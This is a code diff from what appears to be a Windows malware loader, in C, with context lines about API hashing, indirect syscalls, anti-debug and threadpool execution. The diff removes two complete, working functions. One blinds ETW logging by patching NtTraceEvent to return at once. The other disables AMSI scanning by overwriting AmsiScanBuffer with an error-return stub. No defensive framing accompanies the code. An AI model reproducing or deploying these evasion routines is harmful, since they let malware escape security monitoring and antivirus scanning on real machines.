@@ -32,50 +32,6 @@ typedef struct {
     PVOID Buffer;
 } USTRING;
 
-// =============================================================================
-// ETW BYPASS – NtTraceEvent → RET
-// =============================================================================
-
-static BOOL BypassETW() {
-    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
-    if (!hNtdll) return FALSE;
-
-    // Find NtTraceEvent by walking export table
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
-    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (!expRVA) return FALSE;
-
-    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
-    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
-    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
-    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
-
-    PVOID pNtTraceEvent = NULL;
-    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
-        const char *name = (const char *)((PBYTE)hNtdll + pNames[i]);
-        // Match "NtTraceEvent" via hash comparison
-        if (name[0] == 'N' && name[1] == 't' && name[2] == 'T' &&
-            name[3] == 'r' && name[4] == 'a' && name[5] == 'c' &&
-            name[6] == 'e' && name[7] == 'E') {
-            pNtTraceEvent = (PVOID)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
-            break;
-        }
-    }
-    if (!pNtTraceEvent) return FALSE;
-
-    // Patch first byte to RET (0xC3)
-    PVOID pAddr = pNtTraceEvent;
-    SIZE_T patchSize = 1;
-    ULONG oldProtect = 0;
-    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
-        (HANDLE)-1, &pAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    *(PBYTE)pNtTraceEvent = 0xC3; // RET
-    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
-        (HANDLE)-1, &pAddr, &patchSize, oldProtect, &oldProtect);
-
-    return TRUE;
-}
 
 // =============================================================================
 // ANTI-DEBUG
@@ -195,67 +151,6 @@ static BOOL EnvironmentSafe() {
     return TRUE;
 }
 
-// =============================================================================
-// AMSI BYPASS – DATA-ONLY PATCHING
-// =============================================================================
-
-static BOOL BypassAMSI_DataOnly() {
-    PVOID hAmsi = NULL;
-    PPEB pPeb = (PPEB)__readgsqword(0x60);
-    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
-    PLIST_ENTRY pEntry = pHead->Flink;
-
-    while (pEntry != pHead) {
-        LDR_DATA_TABLE_ENTRY_PTR *pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
-        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'a') {
-            hAmsi = pMod->DllBase;
-            break;
-        }
-        pEntry = pEntry->Flink;
-    }
-
-    if (!hAmsi) {
-        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
-        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
-        LoadLibraryW_t pLLW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
-        hAmsi = pLLW(OBFUSCATE(L"amsi.dll"));
-    }
-    if (!hAmsi) return FALSE;
-
-    // Patch AmsiScanBuffer: mov eax, 0x80070057; ret (E_INVALIDARG)
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hAmsi;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hAmsi + pDos->e_lfanew);
-    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (!expRVA) return FALSE;
-
-    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hAmsi + expRVA);
-    PDWORD pNames = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfNames);
-    PDWORD pFuncs = (PDWORD)((PBYTE)hAmsi + pExp->AddressOfFunctions);
-    PWORD  pOrds  = (PWORD)((PBYTE)hAmsi + pExp->AddressOfNameOrdinals);
-
-    PVOID pAmsiScanBuffer = NULL;
-    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
-        const char *n = (const char *)((PBYTE)hAmsi + pNames[i]);
-        if (n[0] == 'A' && n[4] == 'S' && n[8] == 'B') { // AmsiScanBuffer
-            pAmsiScanBuffer = (PVOID)((PBYTE)hAmsi + pFuncs[pOrds[i]]);
-            break;
-        }
-    }
-    if (!pAmsiScanBuffer) return FALSE;
-
-    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
-    PVOID pAddr = pAmsiScanBuffer;
-    SIZE_T patchSize = sizeof(patch);
-    ULONG oldProtect = 0;
-
-    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
-        (HANDLE)-1, &pAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
-    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget,
-        (HANDLE)-1, &pAddr, &patchSize, oldProtect, &oldProtect);
-
-    return TRUE;
-}
 
 // =============================================================================
 // STEALTHY EXECUTION VIA THREADPOOL (Replaces APC)
